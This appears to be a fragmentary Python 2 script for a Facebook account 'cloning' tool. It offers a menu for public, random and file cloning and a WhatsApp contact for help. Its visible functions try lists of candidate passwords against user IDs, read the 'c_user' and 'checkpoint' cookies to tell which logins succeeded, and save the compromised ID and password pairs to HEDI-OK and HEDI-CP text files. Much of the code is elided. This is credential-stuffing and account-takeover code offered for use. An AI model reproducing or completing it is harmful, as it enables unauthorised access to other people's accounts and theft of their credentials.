def main_system():
    ...
    print ""
    print 39*'~'
    print "\x1b[1;93m[1]   Public Cloning      \x1b[1;94m(Login)"
    print "\x1b[1;93m[2]   Random Cloning     \x1b[1;92m (No Login)"
    print "\x1b[1;93m[3]   File Cloning       \x1b[1;92m (No Login)"
    print "\x1b[1;93m[4]   File Making Menu\x1b[1;94m    (Login)"
    print "\x1b[1;94m[5]   Check Subscription "
    print "\x1b[1;93m[6]   Update Tools"
    print "\x1b[1;93m[7]   For Any Help Massage Me on Wathsapp"
    print 43*'~'
    print "\x1b[1;92m[*] \x1b[1;93m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp "
    print 43*'~'
    main_input()
def main_input():
    ...
    if mx=='1':
        print ""
        print('\033[1;93m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;93m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[HEDI-OK] "+coc+user + " | " + pass1
                ok=open('HEDI-OK.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[HEDI-CP] "+coc+user + " | " + pass1
                    cp=open('HEDI random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def fb_menu():
    ...
    try:
        ...
        if pp=='1':
            ...
            try:
                ...
                print ""
                print ""
                print ('\033[1;94m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
        else:
    ...
    print "\033[1;93m[0] Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
        print "\033[1;92m      [ Public Cloning Pro ]"
        print ""
        ...
        print "\033[1;94m[0] Back"
        print ""
        vv=raw_input("\033[1;94m[!] Select :\033[1;92m ")
        if vv=="1":
            xokp()
        elif vv=="2":
            xoknp()
...
def mineExt():
    ...
    print g+"[=] Extracting From Hedi : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass1
                ok=open('HEDI-OK.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass1
                    cp=open('HEDI-CP.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass2
                        ok=open('HEDI-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass2
                            cp=open('HEDI-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass3
                                ok=open('HEDI-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass3
                                    cp=open('HEDI-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass4
                                        ok=open('HEDI-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass4
                                            cp=open('HEDI-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass5
                                                ok=open('HEDI-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass5
                                                    cp=open('HEDI-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def ext10():
    ...
    d11=raw_input('[11] Enter ID : ')
    d12=raw_input('[12] Enter ID : ')
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[HEDI-OK] "+uid + " | " + pass6
                                                        ok=open('HEDI-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;94m[HEDI-CP] "+uid + " | " + pass6
                                                            cp=open('HEDI-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
